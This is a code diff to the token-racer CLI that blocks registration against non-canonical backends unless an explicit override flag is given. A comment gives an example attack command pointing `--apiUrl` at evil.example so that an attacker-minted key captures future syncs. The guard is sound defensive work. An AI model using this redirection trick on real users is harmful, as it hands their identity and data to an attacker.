@@ -8,6 +8,10 @@ import { ensureTokenRacerDirs } from "../state/paths.ts";
 import { loadConfig, checkpointExistingLogs } from "../setup.ts";
 import { detectProviders } from "../providers/auto-detect.ts";
 import { KEYS_DIR, CONFIG_FILE, DEFAULT_API_URL } from "../constants.ts";
+
+// See comment in commands/setup.ts — we compare against this immutable literal
+// rather than DEFAULT_API_URL because the latter can be env-overridden.
+const CANONICAL_HOSTED_URL = "https://token-racer-backend.onrender.com";
 import { promptWithDefault, isInteractive } from "../io/prompt.ts";
 import type { DaemonConfig } from "../types.ts";
 
@@ -31,6 +35,12 @@ const authCommand = define({
 			description:
 				"Nickname to register with (3–30 chars, letters/digits/dashes). Skip to prompt / auto-generate.",
 		},
+		"allow-custom-backend": {
+			type: "boolean",
+			description:
+				"Required on `register` when --apiUrl points somewhere other than the canonical hosted backend. Custom backends see everything the CLI emits and mint the apiKey that identifies you.",
+			default: false,
+		},
 	},
 	async run(ctx) {
 		const operation = ctx.positionals[1];
@@ -51,6 +61,37 @@ const authCommand = define({
 					await runInit(ctx.values.force);
 					break;
 				case "register": {
+					// Gate: refuse to register with a non-canonical backend unless
+					// --allow-custom-backend is explicitly passed. See
+					// commands/setup.ts for the full rationale — in short, a
+					// victim-run `auth register --apiUrl https://evil.example`
+					// persists an attacker-minted apiKey into ~/.token-racer/ and
+					// silently redirects every future sync.
+					const normalizedUrl = ctx.values.apiUrl.replace(/\/$/, "");
+					const isCustomBackend = normalizedUrl !== CANONICAL_HOSTED_URL;
+					const allowCustomBackend = ctx.values["allow-custom-backend"] === true;
+					if (isCustomBackend && !allowCustomBackend) {
+						process.stderr.write(
+							pc.red(`Error: refusing to register with non-canonical backend ${pc.bold(normalizedUrl)}.\n`),
+						);
+						process.stderr.write(
+							pc.yellow(`  A custom backend sees everything the CLI emits and\n`) +
+							pc.yellow(`  mints the API key that identifies you. If that's not\n`) +
+							pc.yellow(`  what you meant, don't run this command.\n\n`),
+						);
+						process.stderr.write(
+							`  To proceed intentionally, re-run with:\n` +
+							pc.bold(`      token-racer auth register --apiUrl ${normalizedUrl} --allow-custom-backend\n\n`) +
+							pc.dim(`  Canonical hosted backend: ${CANONICAL_HOSTED_URL}\n`),
+						);
+						process.exitCode = 1;
+						return;
+					}
+					if (isCustomBackend) {
+						process.stdout.write(
+							pc.yellow(`  ⚠ Registering with custom backend: ${pc.bold(normalizedUrl)}\n\n`),
+						);
+					}
 					const outcome = await runRegister(ctx.values.apiUrl, ctx.values.nickname);
 					if (outcome === "failed") process.exitCode = 1;
 					break;
